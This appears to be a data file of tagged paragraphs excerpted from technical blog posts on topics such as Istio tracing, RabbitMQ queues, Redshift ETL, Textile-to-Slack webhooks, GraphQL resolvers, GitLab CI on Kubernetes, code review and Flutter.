296,"As I said, we want to trace application layer protocols. This means that the proxy servers implemented next to each service should understand exactly what networking event is happening at the moment. By default, Istio comes with plain TCP configured for all ports, which means that no traces are sent. To send traces, we need to, first, enable the respective option in the main mesh config and thenjust as importantlyname all the ports of the kubernetes service entities in accordance with the protocol implemented in the service. For example, like this: We can also use composite names, such as http-magic (Istio will see http and recognize the port as http endpoint).","['Docker', 'Kubernetes', 'Istio', 'Distributed Tracing', 'Observability']",11
297,"The endpoint for sending tracing spans must also be specified in the envoy proxy launch flags, for example: -zipkin Address tracing-collector.tracing:9411Unfortunately, this is not the case. The complexity of implementation depends on how your services interact. The problem is that, to make Istio proxy understand the match between the services incoming and outgoing requests, intercepting all traffic is not enough. You need some kind of match identifier. HTTP envoy proxy uses special headers, by which envoy understands exactly which request to the service generates specific requests to other services.","['Docker', 'Kubernetes', 'Istio', 'Distributed Tracing', 'Observability']",11
298,"Reinventing the wheel is a special kind of crazy, in software. Ancient languages, frameworks, and libraries are safe. Stability and bug free code is always the goal, and you arent going to achieve that goal by thinking youre some kind of software hero coding up your own graphing library. Perhaps your skills are better used knee deep in business logic.","['Programming', 'Software Engineering', 'Entrepreneurship', 'Software Development', 'Engineering']",9
299,"Secondly, working with systems that you have no control over can be a huge pain. In our case, Dialogflow and Team Player each came with their own set of problems, and having to work through them was definitely a struggle. In the case of Dialogflow, it was mostly a lack of documentation on their part with how their service was supposed to integrate with Messenger to send different types of messages. It ended up being a lot more complicated than just sending them the same thing we would have sent to Facebook. For Team Player, it would have been nice if we could have had them make requests to us each time new score data was input into the database instead of us having to poll for updates. This would have saved us from doing a lot of work and taken a fair amount of load off their servers.",['Bots'],1
300,"We should derive and refresh test data from production usage of an application. Is this approach only useful for teams that build applications on large scale databases and are releasing new versions at a rapid velocity? Which types of software development teams would benefit from such ability? At one of my previous companies, we released a new version per quarter. The application was driven by a small (relative to current standards) single tenant database. Even in this context, comprehensive test databases were extremely critical to ensuring robust releases. And, we could have achieved higher quality and higher velocity at a lower cost if we had the ability to derive and refresh test data from production usage of our application. Therefore, we believe that such a strategy and tool should benefit any team developing an enterprise application: Driven by a rich database Whose users are not tolerant to errors. That is, the cost of releasing a bug in software is high because it disrupts their end user flows and erodes users experience and trust in the development team.","['Test Data', 'Test Automation', 'Developer Productivity', 'Developer Tools', 'Engineering Mangement']",13
301,"We want to build a work queue system. We want to maintain a queue of tasks / work where we would push new work. Workers will actively monitor the queue and do these work as they come. A work queue system is ideal for background jobs which can take time, take longer than your average http request. A common example I use often to describe work queuesif your app handles user uploaded photos, creates several versions (thumbnails, different sizes) and shares them on different social media, how would you handle these? Resizing the photos and uploading them on other sites will definitely take time. Do you want to do this inside your http handler? Instead, when a photo is uploaded, store the photo somewhere convenient and pass the details to background workers which will then process the photo and upload wherever needed.","['Rabbitmq', 'Go', 'Golang', 'Message Queue']",6
302,"In this post, we really dont want to go into building a full fledged web app with file uploads. We want to keep it short. So we will do things on the command line. We will build a command line publisher tool which will publish/produce messages. And a consumer which will consume messages. We will then run multiple instances of the consumers in parallel to show how we can scale this system by adding more workers.","['Rabbitmq', 'Go', 'Golang', 'Message Queue']",6
303,"If the connection succeeds, we need to establish a channel. Do not confuse it with Gos channel. Rabbit MQ has its own concept of channels. A connection is a TCP connection from the client to server. A connection is not cheap to create. A channel serves as the communication protocol over the connection. We should aim to limit connections to a minimum number while establishing as many channels as we need, on top of these connections.","['Rabbitmq', 'Go', 'Golang', 'Message Queue']",11
304,"Rabbit MQ starts delivering messages to consumers in round robin fashion. So it equally distributes work among all workers. If some work take way longer and some finish very first, one worker will have a lot of accumulated tasks, another one will not break a sweat at all. One worker will always be busy, one will be always idle. To eliminate such scenarios, we ask Rabbit MQ to deliver new messages only when the worker has acknowledged previous message. The Qos function documentation can explain more.","['Rabbitmq', 'Go', 'Golang', 'Message Queue']",10
305,"I kept each operation atomic so that multiple instances of each operation can run independently of each other, which will help to achieve parallelism. One of the major challenges was to achieve parallelism while running the ETL tasks. One option was to develop our own framework based on threads or developing a distributed task scheduler tool using a message broker tool like Celery combined with Rabbit MQ. After doing some research I settled for Apache Airflow. Airflow is a Python-based scheduler where you can define DAGs (Directed Acyclic Graphs), which would run as per the given schedule and run tasks in parallel in each phase of your ETL. You can define DAG as Python code and it also enables you to handle the state of your DAG run using environment variables. Features like task retries on failure handling are a plus.","['Big Data', 'Etl', 'Mongodb', 'Amazon Redshift', 'Apache Airflow']",8
306,"Redshift is based on Postgre SQL and one of the common problems is when you delete records from Redshift tables it does not actually free up space. So if your ETL process is deleting and creating new records frequently, then you may run out of Redshift storage space. VACUUM operation for Redshift is the solution to this problem. Instead of making VACUUM operation a part of your main ETL flow, define a different workflow which runs on a different schedule to run VACUUM operation. VACUUM operation reclaims space and resorts rows in either a specified table or all tables in the current database. VACUUM operation can be FULL, SORT ONLY, DELETE ONLY & REINDEX. More information on VACUUM can be found here.","['Big Data', 'Etl', 'Mongodb', 'Amazon Redshift', 'Apache Airflow']",8
307,"ETL would be faster if you keep track of the already processed data and process only the new data. If you are doing a full load of data in each ETL run, then the solution would not scale as your data scales. As a solution to this, we made it mandatory for the collection in our Mongo DB to have a created and modified date. Our ETL would check the maximum value of the modified date for the given collection from the Redshift table. It will then generate the filter query to fetch only those records from Mongo DB which have modified date greater than that of the maximum value. It may be difficult for you to make changes in your product, but its worth the effort! A good approach is to write files in some compressed format. It saves your storage space on ETL server and also helps when you load data to Redshift. Redshift COPY command suggests that you provide compressed files as input. Also instead of a single huge file, you should split your files into parts and give all files to a single COPY command. This will enable Redshift to use its computing resources across the cluster to do the copy in parallel, leading to faster loads.","['Big Data', 'Etl', 'Mongodb', 'Amazon Redshift', 'Apache Airflow']",8
308,"One of the major overhead in the ETL process is to write data first to ETL server and then uploading it to S3. In order to reduce disk IO, you should not store data to ETL server. Instead, use Mongo DBs handy stream API. For Mongo DB Node driver, both the collection.find() and the collection.aggregate() function return cursors. The stream method also accepts a transform function as a parameter. All your custom transform logic could go into the transform function. AWS S3s node librarys upload() function, also accepts readable streams. Use the stream from the Mongo DB Node stream method, pipe it into zlib to gzip it, then feed the readable stream into AWS S3s Node library. You will see a large improvement in your ETL process by this simple but important change.","['Big Data', 'Etl', 'Mongodb', 'Amazon Redshift', 'Apache Airflow']",8
309,"Optimizing Redshift Queries helps in making the ETL system highly scalable, efficient and also reduce the cost. Let's look at some of the approaches: Redshift database is clustered, meaning your data is stored across cluster nodes. When you query for certain set of records, Redshift has to search for those records in each node, leading to slow queries. A distribution key is a single metric, which will decide the data distribution of all data records across your tables. If you have a single metric which is available for all your data, you can specify it as a distribution key. When loading data into Redshift, all data for a certain value of distribution key will be placed on a single node of Redshift cluster. So when you query for certain records Redshift knows exactly where to search for your data. This is only useful when you are also using the distribution key to query the data.","['Big Data', 'Etl', 'Mongodb', 'Amazon Redshift', 'Apache Airflow']",8
310,"There are several stream events for the Heartbeat tracking server. This blog would cover the essential events that are required for tracking a complete media playback. Post practicing these handson, you would be equipped with enough knowledge on how to implement the rest. List of events covered:session Start Initiates a heartbeat/media stream session at heartbeat serverplay Sets the event for start of a media contentping Heartbeatspause Start Sets the event for pausing the media contentsession End Sets the event for completion of a media contentsession Complete Compelte the heartbeat/media stream session All these events are sent to the heartbeat tracking server, which appears similar to the analytics tracking server, except the .sc. would be replaced by .d2.hb-api, which points to the heartbeat api tracking server. Example: Analytics server = abc123corp.sc.omtrd.net Heartbeat API server = abc123corp.d2.hb-api.omtrdc.net Knowledge of the Media player api would be essential for this step. For example a HTML5 player would emit the following events via its API: __url__ platforms.","['Heartbeat', 'API', 'Adobe Analytics']",6
311,"Last week we introduced some features of Textiles new IPFS File Loader (name to be decided). These new features make it exceedingly easy to create complex workflows that lead to storing structured data on IPFS. Weve also been having a tone of fun building demos, and keep coming up with cool ideas and fun ways to integrate Textile, Threads, and IPFS. Some of our favorites include sending (fake) logs to IPFS through a Textile Thread using a JSON schema: As well as pushing weather updates to peers within a shared Thread using the command line (and this schema): But adding data to Threads is just part of the puzzle. Weve also implemented tools to get data out. So in this quick and dirty post, well show you how to use our subscribe (sub) API to stream Textile Threads updates to external tools, such as Slack or Twitter or wherever else you might want to send them.","['Slack', 'Decentralization', 'Integration', 'Tutorial', 'Software Development']",6
312,"If you read our last post, youll know that we recently released a new version of our textile-go library that supports reusable workflows to ingest, process, encrypt, host and consume data on IPFS from any device running a Textile peer. The whole system is based around the concept of schemas (which are used to define how data is processed and its storage structure) and Threads (which weve written about already). Along the way, weve added a bunch more useful APIs and tools to make it easier to get things in and out of Threads/IPFS. One such tool, is our Thread subscription API, which allows external tools to subscribe to real-time Thread updates! To show you what this looks like, well build on Sanders examples from last week, where he added various photos of horses to a Thread to share with another peer. Our distributed team uses Slack to communicate, so this time around, well share those updates with an internal Slack channel! Well start by setting up our local Textile peer. You can follow the setup steps from our previous post, and then the actual Textile setup amounts to initializing a wallet: Applying those credentials (youll need SECRET SEED) to initialize a new account: And then firing up a Textile daemon: Easy! Now well simply open up a new console/terminal, create a new --open horses (or whatever you like) Thread with the default --photos schema, and begin crafting our Slack integration: Once youve created that Thread, make note of the id for later So first things first, if were going to try to integrate Textile with Slack, well need to setup our Slack incoming Webhook. From the Slack docs, youll see that incoming Webhooks are a simple way to post messages from apps into Slack. Creating an Incoming Webhook gives you a unique URL to which you send a JSON payload with the message text and some options.","['Slack', 'Decentralization', 'Integration', 'Tutorial', 'Software Development']",6
313,"The curl side of things is relatively simple in comparison! All we need to do is POST our JSON data to the Slack Webhook url. Buuuut, since were streaming our textile sub outputs through jq, well need to process the outputs one line at a time to send to curl. This is really easy to do with a basic bash while loop: See, that was easy. What this does is processes each newline delimited output from jq, and POSTs the JSON as the payload to our Webhook url. Without the while loop, curl wouldnt know when to actually POST our request, and the command would just hang Ok, so with these bits and pieces in place, we can now simply pipe one command to the next, to create the following pipe line: Which could look something like this (you can use the echo ""$LINE"" instead of the curl call for testing): If you really want to get creative, you can wrap this whole thing up in a custom command line tool, so you could call it like this: We used Argbash to wrap the above command pipeline into a quick and dirty tool, just for fun. You can grab it from here if you want to try it out or play around with the above example.","['Slack', 'Decentralization', 'Integration', 'Tutorial', 'Software Development']",11
314,"The last step left is to test it out! You can do this by starting up your bash script or running it as a pipeline, then in another terminal, you can add some photos to the Thread: And thats all well and good, but really, youre just subscribing to your own updates. To make this demo really fun, youll want to invite another peer to the Thread, and have them post some photos! So lets create a new peer (you might want to wallet init a new seed) and start them up: Then invite them using your original peer: Theyll have to accept the invite (watch as they import the previously added photos! ), and then you can have them add a photo or two: Thats it, all done! We hope you enjoyed this quick n dirty tutorial. Were going to continue to publish more of these as we continue to roll out our new APIs and tools, so do let us know what you think! You can reach out over Twitter or Slack, or pull us aside the next time you see us at a conference or event. Were happy to provide background, thoughts, and details on where were taking this work. In the mean time, dont forget to check out our Git Hub repos for code and PRs that showcase our current and old implementations. We try to make sure all our development happens out in the open, so you can see things as they develop. Additionally, dont miss out on signing up for our waitlist, where you can get early access to Textile Photos, the beautiful mobile interface to Textiles Threads and underlying APIs.","['Slack', 'Decentralization', 'Integration', 'Tutorial', 'Software Development']",7
315,"So how can OO be bad for maintenance? One particular failure state for OO is large inheritance hierarchies which turn out to be inflexible and react to change badly over timebecause most systems dont fit into nice strict hierarchies. For example, in the above (made up but fairly typical) example we have a main backbone of types Renderable / Has Physics / Collidable / Controllable which provide basic functionality to other, more specialized types. The problem is that no matter what order we choose to arrange this backbone in, there will be some subtypes which dont fit in well. For example, classes like invisible wall or story trigger dont fit into the above hierarchy, because everything subclasses from Renderable. This often causes hacks and Liskov violations where subclasses provide lots of null implementations of bits of functionality they dont actually need, and code tends to creep upwards into giant, fragile base classes.","['Game Development', 'Unity', 'Components', 'Ecs', 'Software Development']",9
316,"Design justice focuses on the ways that design reproduces, is reproduced by, and/or challenges the matrix of domination (white supremacy, heteropatriarchy, capitalism, and settler colonialism), and is also a growing social movement At some level its not surprising that this work isnt as well known as it should be. Much of this work has been done by women of color, queer and trans people, and others who are marginalized within the tech world. Much of this is heavily influenced by the social sciences, which are also marginalized by tech. And much of this work is also by the kinds of biases against that anti-oppressive research that Alex Ahmed, Judeth Oden Choi, Teresa Almeida, Kelly Ireland, and I discuss in Whats at Issue: Sex, Stigma, and Politics in ACM Publishing. *So here are some slightly longer overviews of these different areas, each featuring a handful of key papers, along with a few videos. As you read this, Like any literature survey, whats here is filtered through my background and interests; if theres other work that you think should be here, please let me know! The Gender Mag Method, a gender-specialized cognitive walk-through process and a set of four personas, is based on 15+ years of excellent research by Margeret Burnett and a wide range of collaborators (starting with ). Gender Mag: A method for evaluating softwares gender inclusiveness describes five facets of gender-linked differences: motivation, information processing styles, computer self-efficacy, risk aversion, tinkering). The users who tend to be best supported by problem-solving software tend to be those best represented in software development teams (e.g. relatively young, able-bodied, males), with other users perspectives often over-looked. Theres also a community wiki with teaching resources, and an open source Recorders Assistant to help semi-automate the process.","['Design', 'UX', 'Software Development', 'Design Justice']",5
317,"Residual mobilities: infrastructural displacement and post-colonial computing in Bangladesh, by Syed Ishtiaque Ahmed, Nusrat Jahan Mim, and Steven J. Jackson is an example of applying this postcolonial lens. Based on a field study among populations displaced by a development project in Dhaka, Bangladesh, the authors argue that different and heretofore residual experiences of mobility must also be accounted for in post-colonial and other marginal computing environments and document four forms of infrastructural experiencedispossession, reconstitution, collaboration, and repairthat characterize real-world engagements with infrastructure in such settings Mukurtu is a grassroots project aiming to empower communities to manage, share, narrate, and exchange their digital heritage in culturally relevant and ethically-minded ways. In 2007, Warumungu community members collaborated with Kim Christen and Craig Dietrich to produce the Mukurtu Wumpurrarni-kari Archive. Mukurtu is a Warumungu word meaning dilly bag or a safe keeping place for sacred materials. Warumungu elder, Michael Jampin Jones chose Mukurtu as the name for the community archive to remind users that the archive, too, is a safe keeping place where Warumungu people can share stories, knowledge, and cultural materials properly using their own protocols.","['Design', 'UX', 'Software Development', 'Design Justice']",5
318,"Miriam E. Sweeneys chapter on The Intersectional Interface (in The Intersectional Internet, edited by Safiya Umoja Noble and Brendesha M. Tynes) looks at how gender and race shape the design of anthropomorphized virtual agents (AVAs) and illuminates the ethical considerations that designers of technology must engage with if they are to engage socially responsible technologies. Sweeneys The Ms. Dewey experience: Technoculture, gender, and race, in Digital Sociologies, and thesis Not Just a (Pretty) Interface go into more detail on AVAs. Nobles A Future for Intersectional Black Feminist Technology Studies sets this work in a broader context.","['Design', 'UX', 'Software Development', 'Design Justice']",5
319,"Once you start working, actual coding isnt going to take up much of your day. Aside from meetings youll mostly be doing research and design. Think of it this way: your boss starts off by giving you some brand new task, a new feature you have to integrate into the code base. You dont start off by banging away at the keyboard! The first thing you should do is scope out the requirements of the project. What exactly am I trying to accomplish and what should the end result to be like? You may realise that youll have to learn a new technology in order to complete your task and then youll start to do some research on that.","['Programming', 'Software Development', 'Coding', 'Technology', 'Innovation']",2
320,Initially I used the aforementioned data-structure to create a json file and wrote a small react app to render that file. But I didnt find the resulting docs beautiful enough. Instead of trying to make the UI more beautiful I thought that I am most probably wrong in not using a more mature tool for displaying the result. After all documentation is sth for which a lot of tools are already built. After some search I found mkdocs interesting for replacing my handmade UI. In order to use mkdocs my code had to output markdown files instead of json. I made some changes in order to achieve that.,"['Django', 'Tdd', 'Documentation', 'Rest Api', 'Testing']",15
321,"The resulting documentation shows names of subsystems of the code (i.e. Django apps) in the navbar, upon clicking on the name of each app in the navbar, user sees list of test classes in that app on the sidebar. Each test class corresponds to one endpoint under test. For each test class there is a listing of which test cases exist for that class and therefore what response the endpoint generates for each request. Also docstrings of test classes and test methods are made available through the docs. Using docstrings of test classes, one can describe what purpose each endpoint serves and using docstrings of test methods one can describe why a particular request results in a particular response.","['Django', 'Tdd', 'Documentation', 'Rest Api', 'Testing']",15
322,After using DRF Test we gained a lot in terms of time spent on creating and maintaining API docs and also found it easier to write tests for our APIs thanks to its utility methods for sending requests. It helped make communications inside the team more effective and the overall process more agile. Therefore I decided to publish it on Github. I hope it may be useful to others as well. A live demo of documentations generated by drftest is available through this link. The project is hosted on this repo on github. I also made another repo which is a very simple project consisting of a todo API that shows how drftest can be used in a Django project.,"['Django', 'Tdd', 'Documentation', 'Rest Api', 'Testing']",6
323,"At the heart of every Graph QL specification is the schema. The schema is the contract between the server and the client; specifying not only what data is available but also what types of data they are and how they relate. Every field has either a primitive type (such as int, string, float, boolean, etc) or a complex type. This helps to ensure type checking within client applications as a first-class citizen rather than purely a documentation or validation-based tool such as JSON schemas. Schemas are composed of classes made up of one or more fields. Clients may select those classes, choosing precisely the relevant fields needed. The following is a simple example of a movie-based schema using interfaces, types, and enumerations.","['GraphQL', 'Rest', 'Dao', 'Software', 'Database']",8
324,"Example of querying the schema: Schemas also support arguments within field selections to further define customization to clients. As an example, a particular numerical metric field may choose to provide a unit argument that specifies what data unit to output the value in. This is in contrast to typical systems that output a value in a single standard unit and rely on documentation to express what unit it isputting the unnecessary onus on each client to manage the conversions. With Graph QL, the client can specify the precise unit as an argument to the data selection. The Graph QL resolver can then manage the conversions and return the appropriate value to the client. Ultimately, this customization allows the logic and control to happen server side, which is often more effective and easier, removing the stress from each client application.","['GraphQL', 'Rest', 'Dao', 'Software', 'Database']",8
325,"Choosing how to implement the resolvers and what to back them with is often the most critical decision in the design process of the Graph QL server. Often, it is highly dependent on existing systems and how to interoperate with them. Other times, it depends on organizational boundaries and ownership. There are endless methodologies for resolving data access. The three listed here are common variants typically used. These include REST, direct data access via DAOs, and compositional access.","['GraphQL', 'Rest', 'Dao', 'Software', 'Database']",8
326,"The example below uses pseudo-code to map to the movies schema above in order to resolve movies, the characters, and the actors. In this example, there are two distinct backends, which can also be completely separated and managed individually without impacting the Graph QL service:movies-backend provides RESTful API access to the movie catalogactors-backend provides RESTful API access to the actors catalog However, REST can also be detrimental in many aspects. One of the main driving forces of Graph QL is being able to select precisely what data is neededallowing highly efficient data resolutions. However, when the resolvers are backed by REST, then the entire request must be fetched via REST and only certain fields selected from the response. This causes the backend REST system to fetch all the data even though it may not all be needed, leading to slight inefficiencies in the stack. In this particular example, the movie catalog may provide expanded data for the distribution company, musical tracks, etc. This data would be fetched by REST but unused by Graph QL.","['GraphQL', 'Rest', 'Dao', 'Software', 'Database']",8
327,"Overall, the hardest part of any Graph QL implementation is choosing the most efficient data resolution handlers. When using REST, requests should be batched together as much as possible by using the active context and state to determine what types of data need to be fetched and resolving them all at once. Batching also automatically collapses requests to the same endpoint in order to avoid making the same call twice. This leads to more complex situations, yet more efficient implementations. In this particular example, we could batch each actor into the active context state and then fetch all 50 actors in one query. This also avoids making the same calls twice in the same request such as when the same actor appears in multiple movies.","['GraphQL', 'Rest', 'Dao', 'Software', 'Database']",14
328,"If REST is one end of the spectrum for resolving data queries, then direct data access would be the other end of that spectrum. Using direct data access to resolve data involves placing the Graph QL implementation nearest the data source. Data philosophy says that the closer to the data source the logic lives, the more efficient the logic will be. If logic is needed to aggregate different types of data together, then selecting and aggregating the data within the database will be much more efficient than doing so at the client level. The client tier may have to make several requests to fetch the data just to aggregate specific fields together. Typically the closer to the data source, the faster the accessin other words, querying a database is faster than querying an API and this effect is compounded the more tiers that exist. This same ideology holds true with Graph QL resolvers, which is why direct data access is more efficient than RESTthe number of tiers is reduced and data gets moved closer.","['GraphQL', 'Rest', 'Dao', 'Software', 'Database']",8
329,"Direct data access may also result in the N+1 problem. However, the N+1 problem to the database tier is far more performant than to an API tier. Even still, an implementation must be highly cautious of invoking this type of behavior. It is still preferred to attempt to group together queries where possible. For example, rather than invoking a select statement for movies and a select statement for actors, the context can be used to wire up a single select statement that selects both movies and actors together. The big advantage to direct data access is that it is more forgiving of poor implementations than an API tier due to the more efficient querying into the data store.","['GraphQL', 'Rest', 'Dao', 'Software', 'Database']",8
330,"The biggest issues with direct data access are organizational boundaries and ownership. Where REST-based architectures allow multiple teams to be backed by a single Graph QL server, doing the same with direct data access is not as straightforward. Graph QL can be backed by multiple data sources and works very well, but when those data sources cross-organizational boundaries, then ownership of the server becomes an issue and managing the relationships between those backend sources gets more difficult. For example, one team may own personalization data and recommendations whereas a separate team may own the movie data itself. In this particular example, one team may own the movie Db and another team the actor Dbthese teams may not want applications directly querying their data stores, instead preferring access through REST, an SDK, or binary transport such as g RPC. As each tier is added to avoid these boundaries, the server becomes less flexible and less performant.","['GraphQL', 'Rest', 'Dao', 'Software', 'Database']",8
331,"The final methodology of Graph QL is composition which can help resolve organizational boundaries. Composition is the process of stitching together multiple distinct Graph QL servers by defining relationships. This allows each organization to define their specific Graph QL instance for their specific data sets. The composition tier then maps relationships and data sets together. For example, the recommendation server may provide a movie identifier with its Graph QL server. The movie server would provide movie data based on a given identifier. The composition tier would be able to create the relationship from movie identifier to movie data. The resulting Graph QL schema would allow selecting the recommendations and movie data completely, automatically fetching the backend data from each Graph QL server. This selection process is also highly efficient and selects precisely each set of data.","['GraphQL', 'Rest', 'Dao', 'Software', 'Database']",14
332,"The other part where composition breaks down is when not every system uses Graph QL. In these situations, you can not directly stitch together the Graph QL schemas. The best methodology, instead, is to manually stitch together relationships and use binary protocols or REST to fetch each data. Binary protocols, such as g RPC, allow for defining these relationships and stitching data together. The Graph QL server, then, provides the frontend process and schema for selecting the data while the transport tier allows fetching from each distinct microservice. This form of composition allows for a three tier architecture to exist.","['GraphQL', 'Rest', 'Dao', 'Software', 'Database']",8
333,"The business tier uses Graph QL to create a common product-focused schema as well as defining the end relationships between the data sets. The business tier is meant to convert the data-focused sets into product-focused sets while applying business logic rules for the product. This allows the core data to remain agnostic and separated from any specific product, while allowing the products to be shared across multiple applications or views. This tier is important to create common alignment across all views of a particular product. The Graph QL server may choose any of the above methodologies depending on the particular architecture and backend systems. When both product and cores use Graph QL, then schema stitching is the best methodology. For cores that rely only on REST as an abstraction over the data, then REST can be used to map each relationship. For cases where the same team owns the data stores and the product tier, then using the appropriate data store DAO for each data store is more efficient. Typically, however, the end result will be a mixture of all three as systems grow and evolve over time.","['GraphQL', 'Rest', 'Dao', 'Software', 'Database']",8
334,"Graph QL is incredibly powerful and flexible and offers a wide assortment of possibilities when it comes to designing the most appropriate architecture. Deciding which architecture to choose is often the hardest, most critical decision. The best recommendation is to first understand the organizational boundaries and ownership. Who will ultimately own the implementation and architecture? Who owns each of the data sets? How are or how will those data sets be exposed? These types of questions can help decide how to formulate each tier of the architecture.","['GraphQL', 'Rest', 'Dao', 'Software', 'Database']",14
335,"For small organizations or organizations that own data to products end-to-end, it is recommended to stay simple and use direct data access to ensure high efficiency across products. For larger organizations built on several microservices, it is recommended to follow a three-tier architecture that allows microservices to grow independently as either their own distinct Graph QL server or using a binary transport and schema. Product distribution teams would then be able to own the Graph QL tier, connecting the relationships and data sets together. It is best to expose the resolvers nearest the data stores without crossing organizational boundaries. This means it is more preferred to use direct data access, then Graph QL stitching/composition, followed by REST. In general, REST should only be used when required by backend teams or legacy systems.","['GraphQL', 'Rest', 'Dao', 'Software', 'Database']",8
336,"One benefit of using infrastructure as code is repeatability. Lets examine the task of configuring a datacenter, from configuring the networking and security to the deployment of applications. Consider for a moment the amount of work that would be required if you had to do that manually, for multiple environments in each of these regions. First it would be a tedious task, but it would most likely introduce configuration differences and drifts over time. Humans arent great at undertaking repetitive, manual tasks with 100% accuracy, but machines are. Give the same template to a computer and it will execute that template 10,000 times exactly the same way.","['AWS', 'Software Engineering', 'Cloud Computing', 'Technology', 'Architecture']",9
337,"In this article well build a continuous integration and deployment pipeline into Kubernetes running on Google Cloud platform. Well use (1) __url__ for the pipeline, (2) Google Cloud for the Kubernetes, and (3) Spring Boot for the microservices application. This article assumes that you have some familiarity with Google Cloud Platform, Kubernetes, Linux and Spring. Download the code from github at this link.2. Create a new project on G __url__ and connect your local code to __url__ <me> and <repo> are replaced with the correct tags for your repository.3. This will cause Gitlab to run our pipeline on each checkin to the repository. In your Gitlab project, go to Settings CI/CD and expand out the Auto Dev Ops section. Well need 3 variables to be stored here, (1) a Google Key to enable the pipeline in Gitlab to execute commands against our Kubernetes cluster on our behalf, (2) a password to the Gitlab repository where we store the containers built by our pipeline, and (3) a keyword for use in the smoke test portion of our pipeline. Create a variable called REGISTRY_PASSWD and enter your Gitlab account password here. Create another variable called TEST_ONE_KEYWORD and enter the value alive in the box to the right. Also create a variable called GOOGLE_KEY, but dont enter a value just yet. We need some information from Google Cloud Platform to complete that item, and will do that next.a. This is the key representing a service account in Google Cloud Platform which is authorized to do specific actions relative to the Kubernetes cluster. It represents a Service Account in GCP. For this step, youll need a Google Cloud Platform account and project (if you dont already have one, follow these steps to get that in place). First, go to your cloud console for the project you want to use, and select IAMAdmin Service Account.","['Docker', 'Kubernetes Engine', 'Continuous Delivery', 'Gitlab', 'Google Cloud Platform']",7
338,"So, we have a warmup stage. Here, we are scaling up our deployment and testing cluster. Our cluster is always alive, but is kept at 0 nodes when not in use, to save resource cost. In GCP Kubernetes Engine the nodes are actually VMs, and while they are running we incur cost. So, when we are not testing new code, we reduce the nodes to 0, so no VMs are running. The cluster is still alive, it just have far fewer resources allocated.","['Docker', 'Kubernetes Engine', 'Continuous Delivery', 'Gitlab', 'Google Cloud Platform']",10
339,"One of the issues that Cant Pay? This trap starts when a person gets into a (relatively) small amount of debt. On top of that debt they have to pay interest. If they struggle to pay the debt + interest back then they end up having to pay court fees, agents fees and more. Before the they know it the total amount requested is massive.","['Software Development', 'Technology', 'Programming', 'Computer Science', 'Software Architecture']",4
340,"Its a good gesture to include technical explanations and links to useful articles or resources whenever requesting a change. Because a change request shouldnt be taken as your sole desire, but as a necessary measure that benefits everybody. Had the time been critical, its useful to give your colleague a hand or, perhaps, pair program to achieve the common goal, which is a quality code being merged. Turning an unpleasing fact of redoing your work into a supportive opportunity to learn is a great twist of events! There was a time I have been evaluating missing commas or semicolons during my reviews. Although this is redundant and contributes close to nothing, its a good example of how technical debt is paid by wasting everybodys time. We didnt have any code auto-formatting, and people often ignored ESLint warnings in the console.","['Software Development', 'Code Review', 'Soft Skills', 'Teamwork', 'Lessons Learned']",9
341,"What if a feature is small and has a clear development plan in mind, yet still requires to change the half of the entire codebase? I can recommend the approach weve used for such pull requests, and its called intermediate code reviews. It aims to resolve the amount of changes a reviewer should evaluate, thus resulting into short iterative review sessions. As an issuer, that means a rule to create a pull request, no matter the changes status, not later than the next morning after typing a first character. For a reviewer it acts as a rule to always resolve assigned pull requests not later than the next morning. Of course, any necessary communication could also take place so that things are reviewed sooner, or later.","['Software Development', 'Code Review', 'Soft Skills', 'Teamwork', 'Lessons Learned']",13
342,"But this year, React Native seems to be losing (or have already lost) much of its appeal, with some notable companies have announced they are abandoning it (check out this article by Airbnbs Gabriel Peal, or this other one by Udacitys Nate Ebel). Talking to developers and judging from whats being published in articles, or from what recruiters look for on Linked In, it would appear that its just not that hot anymore. To be clear though, its not dead and the fact that it didnt work so well for some companies doesnt mean that it wont work for others. Many of these companies used it on subsections of their apps rather than on all of it, which is one of the reasons it was so complex to use. However, one cant deny that if big companies that contribute to the popularity of a technology (by writing about it and creating popular open-source libraries for it) eventually decide to leave it, it has an impact on the community. At the very minimum, teams that were previously on the fence about using it had an easier decision to make, using posts such as the above to back up their arguments.","['Flutter', 'iOS App Development', 'Android App Development', 'Mobile App Development', 'Apps']",19
343,"The fact that Flutter does its own UI drawing rather than being a wrapper around the platform-specific native components has both pros and cons. The pro is that if something is rendered in some way on your test i Phone with i OS 12, for example, it should be rendered in exactly the same way, not only on any other i OS version but also on any Android phone. With React Native or Xamarin, the UI components have a number of properties that are only supported in one platform or the other, or maybe they are supported but translated in slightly different ways to their native counterparts behind the scenes. This means that you either need to test on a lot of devices and OS versions (and potentially write platform specific code to fix some situations), or just know that it might look broken (or at least different) for some users. Your app might even crash if you use an attribute or a feature thats not supported on a specific OS version. With Flutter you will be much safer (at least for the UI part of the app). You should still check the app on multiple devices, especially if you use third party plugins that do map to underlying platform-specific native components. This will be the case if you use things like audio/video, push notifications, in-app billing etc.). The negative side of this approach is covered in the next section of the article.","['Flutter', 'iOS App Development', 'Android App Development', 'Mobile App Development', 'Apps']",19
344,"I have to say I didnt really find anything that deserved to stay under a bad or ugly section, but heres a list of things that arent as good, at least from certain point of views: As mentioned a couple of times already, Flutter paints the UI on its own custom way, it doesnt create native components. It does a very good job at replicating Androids Material Design and also i OS-specific components with its Cupertino library but its still not native under the hood. This has a few implications, such as:(A) If i OS 13 changed the way a segmented control or a UISwitch is rendered, your Flutter app that uses Cupertino Segmented Control or Cupertino Switch would keep the old look until Flutter is updated and you rebuild it. One can argue that many users wouldnt care (most of my non-techy friends wouldnt care and wouldnt even notice, for example, theyd just care about the app looking pretty enough rather than whether its 100 per cent consistent with the OSs pure look and feel), but it might be a deal breaker if youre a purist. (B) If you plan to use Flutter for just a section of an existing app (which is covered here in Flutters wiki, here in an article by Tomek Polaski, and here in an article by Jan Reehuis), you might see a difference between the native part and Flutter part. Again, this might bother you (and your users) or not. Much less of a problem for new apps that are 100 per cent Flutter of course. (C) To make things as easy as possible for you as a dev, and assuming that your users dont care about the native look of the app, you could just use Material App (which uses Material Design components) and compile it for both Android and i OS. It will work fine, despite the non-native appearance, and it is in fact what I did for my app. If, instead, you do care about this, and decide to use Material App for Android and a Cupertino App for i OS, youll be duplicating most if not all the code for your UI (which can be a considerable part of your app), and youll make the architecture more complex. Consider this carefully and decide if itd be worthwhile.","['Flutter', 'iOS App Development', 'Android App Development', 'Mobile App Development', 'Apps']",19
